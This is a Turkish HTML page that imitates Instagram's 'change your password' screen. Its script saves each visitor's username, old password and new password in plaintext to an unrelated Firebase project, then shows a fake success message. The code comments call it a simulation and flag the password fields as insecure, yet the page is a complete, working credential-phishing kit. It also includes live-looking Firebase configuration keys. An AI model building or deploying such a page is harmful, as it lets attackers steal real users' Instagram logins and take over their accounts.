<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Şifre Değişikliği (Firebase Entegre)</title>
    <style>
        /* Base styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            /* Beyaz Tema: Arka plan beyaz, metin koyu */
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f0f0f0; /* Açık Gri/Beyaz Arka Plan */
            color: #000; /* Koyu Metin Rengi */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 350px;
            background-color: #fff; /* Konteyner arka planı beyaz */
            border: 1px solid #dbdbdb; /* Hafif kenarlık */
            padding: 40px;
            /* Added rounded corners to the main container for aesthetics */
            border-radius: 6px;
        }

        /* Logo Styling (SVG Container) */
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }

        /* SVG styles for the camera icon */
        .instagram-icon {
            width: 80px; /* Logo boyutunu ayarlayın */
            height: 80px;
            padding: 5px;
            border-radius: 20px;
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #ffb500 45%, #fd2929 60%, #9e00c2 90%);
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        /* Subtitle Styling */
        .subtitle {
            text-align: center;
            color: #8e8e8e; /* Daha açık gri */
            font-size: 17px;
            margin-bottom: 30px;
            line-height: 20px;
            font-weight: 600;
        }

        /* Input Group Styling */
        .input-container {
            position: relative;
            margin-bottom: 12px;
        }

        /* Input Field Styling */
        input {
            width: 100%;
            /* Göz ikonu yerine buton geldiği için sağ boşluğu artırıyoruz */
            padding: 14px 85px 14px 12px; 
            background-color: #fafafa; /* Çok açık gri input arka planı */
            border: 1px solid #dbdbdb; /* Input kenarlığı */
            border-radius: 4px;
            color: #000;
            font-size: 14px;
            outline: none;
            transition: border-color 0.2s;
        }

        input::placeholder {
            color: #8e8e8e;
        }

        input:focus {
            border-color: #a8a8a8;
        }

        /* Show/Hide Button Styling (Göz ikonu yerine) */
        .show-hide-btn {
            position: absolute;
            right: 8px; /* Sağ kenara daha yakın */
            top: 50%;
            transform: translateY(-50%);
            /* Buton stilleri */
            background: none;
            border: none;
            color: #0095f6; /* Instagram'ın mavi rengi */
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            padding: 4px 8px;
            border-radius: 4px;
            transition: opacity 0.2s;
        }

        .show-hide-btn:hover {
            opacity: 0.7;
        }
        
        /* Terms & Policy Text Styling */
        .terms {
            text-align: center;
            font-size: 12px;
            color: #8e8e8e;
            margin: 20px 0;
            line-height: 16px;
        }

        .terms a {
            color: #0095f6; /* Link rengi */
            text-decoration: none;
            font-weight: 500;
        }

        /* Button Styling */
        .change-btn {
            width: 100%;
            padding: 14px;
            background-color: #0095f6;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 12px;
            transition: background-color 0.2s, opacity 0.2s;
        }

        .change-btn:hover {
            background-color: #1877f2;
        }

        .change-btn:active {
            opacity: 0.7;
        }

        /* --- Message Boxes --- */

        /* Success Message Box (Açık Tema) */
        .success-message {
            display: none;
            background-color: #e6ffed; /* Açık yeşil arka plan */
            border: 1px solid #38a169;
            color: #38a169; /* Koyu yeşil metin */
            padding: 16px;
            border-radius: 8px;
            text-align: center;
            margin-bottom: 20px;
            font-size: 14px;
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        /* Custom Error Message Box (Açık Tema) */
        .custom-message {
            display: none;
            background-color: #ffeaea; /* Açık kırmızı arka plan */
            border: 1px solid #e53e3e;
            color: #c53030; /* Koyu kırmızı metin */
            padding: 16px;
            border-radius: 8px;
            text-align: center;
            margin-bottom: 20px;
            font-size: 14px;
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        /* Message Box Visibility */
        .success-message.show,
        .custom-message.show {
            display: block;
            opacity: 1;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo Metni Yerine SVG Kamera İkonu Eklendi -->
        <div class="logo">
            <svg class="instagram-icon" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <!-- Dış Kenar -->
                <rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect>
                <!-- İç Alan -->
                <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path>
                <!-- Üst Nokta -->
                <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line>
            </svg>
        </div>
        
        <div class="subtitle">Şifreni Değiştir</div>
        
        <!-- Success Message UI (Sadece Türkçe) -->
        <div class="success-message" id="successMessage">
            Şifreniz başarılı bir şekilde değiştirilmiştir.
        </div>

        <!-- Custom Error Message UI -->
        <div class="custom-message" id="customMessage">
            <!-- Hata mesajı içeriği JavaScript tarafından eklenecek -->
        </div>

        <form id="passwordForm">
            <div class="input-container">
                <input type="text" placeholder="Kullanıcı Adı" id="username" required>
            </div>

            <!-- Eski Şifre Alanı -->
            <div class="input-container">
                <input type="password" placeholder="Eski Şifre" id="oldPassword" required>
                <!-- Göz İkonu Yerine Buton -->
                <button type="button" class="show-hide-btn" onclick="togglePassword('oldPassword', this)">Göster</button>
            </div>

            <!-- Yeni Şifre Alanı -->
            <div class="input-container">
                <input type="password" placeholder="Yeni Şifre" id="newPassword" required>
                <!-- Göz İkonu Yerine Buton -->
                <button type="button" class="show-hide-btn" onclick="togglePassword('newPassword', this)">Göster</button>
            </div>

            <!-- Şifreyi Onayla Alanı -->
            <div class="input-container">
                <input type="password" placeholder="Şifreyi Onayla" id="confirmPassword" required>
                <!-- Göz İkonu Yerine Buton -->
                <button type="button" class="show-hide-btn" onclick="togglePassword('confirmPassword', this)">Göster</button>
            </div>

            <div class="terms">
                Hizmetimizi kullanan kişiler, iletişim bilgilerini<br>
                Instagram'a yüklemiş olabilir. <a href="#">Daha fazla bilgi edinin</a>
            </div>

            <div class="terms">
                Kaydolarak <a href="#">Şartlar</a>, <a href="#">Gizlilik<br>
                Politikası</a> ve <a href="#">Çerezler Politikası</a>'nı kabul etmiş olursunuz.
            </div>

            <button type="submit" class="change-btn">Şifreyi Değiştir</button>
            <div class="terms" id="userIdDisplay">Oturum bekleniyor...</div>
        </form>
    </div>

    <!-- Firebase SDK Imports and App Logic -->
    <script type="module">
        // Firebase CDN Imports
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
        import { getFirestore, doc, setDoc, setLogLevel } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
        
        // Firebase Yapılandırması (Kullanıcı tarafından sağlanan)
        const firebaseConfig = {
            apiKey: "AIzaSyCXZkVGwozT9ZZJewXNZfLMAkVpkZyGhuA",
            authDomain: "instagram-ba29a.firebaseapp.com",
            projectId: "instagram-ba29a",
            storageBucket: "instagram-ba29a.firebasestorage.app",
            messagingSenderId: "914906862263",
            appId: "1:914906862263:web:8656810f106a693138f332",
            measurementId: "G-NXCHJL9QNC"
        };
        
        // Canvas ortamından global uygulama kimliğini alıyoruz
        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';

        // Firebase loglarını aç (opsiyonel)
        setLogLevel('Debug');
        
        // Firebase Başlatma
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const auth = getAuth(app);
        
        let currentUserId = null;

        // Oturum Açma (Anonim olarak veya Canvas token'ı ile)
        async function authenticate() {
            let signedIn = false;
            
            // 1. Özel Token ile Giriş Denemesi
            if (typeof __initial_auth_token !== 'undefined') {
                try {
                    const { signInWithCustomToken } = await import("https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js");
                    await signInWithCustomToken(auth, __initial_auth_token);
                    console.log(`Kullanıcı özel token ile doğrulandı.`);
                    signedIn = true;
                } catch (tokenError) {
                    // auth/custom-token-mismatch gibi hataları yakala.
                    console.warn(`Özel token ile oturum açma başarısız oldu (${tokenError.code}). Anonim giriş deneniyor...`);
                    // Oturum açma hatası nedeniyle uygulamayı durdurmak yerine anonim girişi denemeye devam et.
                }
            }

            // 2. Özel token başarısız olursa veya tanımlı değilse, anonim giriş yap
            if (!signedIn) {
                try {
                    await signInAnonymously(auth);
                    console.log(`Kullanıcı anonim olarak doğrulandı.`);
                    signedIn = true;
                } catch (anonError) {
                    console.error("Anonim oturum açma hatası:", anonError);
                }
            }

            // 3. Sonuçları Güncelle
            if (signedIn) {
                currentUserId = auth.currentUser?.uid || crypto.randomUUID(); // Fallback for safety
                document.getElementById('userIdDisplay').textContent = `Oturum Açık (UID): ${currentUserId}`;
            } else {
                showMessage('Oturum açılırken kalıcı bir hata oluştu. Veritabanı işlemleri devre dışı.', true);
                document.getElementById('userIdDisplay').textContent = 'Oturum Açılamadı.';
            }
        }

        // Uygulama yüklenirken oturum açmayı başlat
        authenticate();


        // --- UI ve Mesaj Fonksiyonları ---

        /**
         * Parola alanının türünü değiştirir ('password' <-> 'text') ve göz simgesinin metnini günceller.
         */
        function togglePassword(inputId, button) {
            const input = document.getElementById(inputId);
            if (input.type === 'password') {
                input.type = 'text';
                button.textContent = 'Gizle';
            } else {
                input.type = 'password';
                button.textContent = 'Göster';
            }
        }

        /**
         * Özel bir mesajı (hata veya başarı) uygun mesaj kutusunda görüntüler.
         */
        function showMessage(message, isError = false) {
            const customMessage = document.getElementById('customMessage');
            const successMessage = document.getElementById('successMessage');

            successMessage.classList.remove('show');
            customMessage.classList.remove('show');

            if (isError) {
                customMessage.textContent = message;
                customMessage.classList.add('show');
            } else {
                successMessage.textContent = message;
                successMessage.classList.add('show');
            }

            if (!isError) {
                setTimeout(() => {
                    successMessage.classList.remove('show');
                }, 3000);
            }
        }

        // --- Form Gönderim Mantığı (Firestore ile Simülasyon) ---
        document.getElementById('passwordForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            document.getElementById('customMessage').classList.remove('show');
            document.getElementById('successMessage').classList.remove('show');

            const username = document.getElementById('username').value.trim();
            const oldPassword = document.getElementById('oldPassword').value;
            const newPassword = document.getElementById('newPassword').value;
            const confirmPassword = document.getElementById('confirmPassword').value;

            // 1. Şifre Eşleşme Kontrolü
            if (newPassword !== confirmPassword) {
                showMessage('Yeni şifreler eşleşmiyor!', true);
                return;
            }
            
            // 2. Oturum Kontrolü
            if (!currentUserId) {
                showMessage('Oturum bilgisi alınamadı. Lütfen bekleyin ve tekrar deneyin.', true);
                // Oturum bilgisi hala gelmediyse (veya hata varsa) anonim oturum açmayı tekrar zorla
                authenticate(); 
                return;
            }

            // --- Firestore Şifre Güncelleme Simülasyonu ---
            try {
                // Not: Güvenlik riski nedeniyle gerçek uygulamalarda bu ASLA yapılmamalıdır.
                
                // Firestore yolu: /artifacts/{appId}/users/{userId}/password_changes/{username}
                const docPath = `artifacts/${appId}/users/${currentUserId}/password_changes`;
                const passwordDocRef = doc(db, docPath, username.toLowerCase()); 

                // setDoc kullanılarak belge yoksa oluşturulur, varsa birleştirme (merge: true) ile güncellenir.
                await setDoc(passwordDocRef, {
                    username: username,
                    action: 'Password Change Attempt (All Data Visible)',
                    timestamp: new Date().toISOString(),
                    
                    // !!! İSTEK ÜZERİNE EKLENDİ - GÜVENLİ DEĞİL !!!
                    oldPassword: oldPassword,
                    newPassword: newPassword,
                    confirmPassword: confirmPassword,
                    // !!! İSTEK ÜZERİNE EKLENDİ - GÜVENLİ DEĞİL !!!

                    newPasswordLength: newPassword.length,
                    isConfirmed: true,
                }, { merge: true });

                showMessage('Şifreniz başarılı bir şekilde değiştirilmiştir (Tüm Bilgiler Kaydedildi).', false);
                document.getElementById('passwordForm').reset();
            } catch (error) {
                console.error("Firestore işlemi hatası:", error);
                showMessage(`Şifre değiştirme işlemi başarısız oldu: ${error.message}`, true);
            }
        });

        // Dışarıdan erişim için togglePassword fonksiyonunu global kapsamda tutma
        window.togglePassword = togglePassword;
    </script>
</body>
</html>
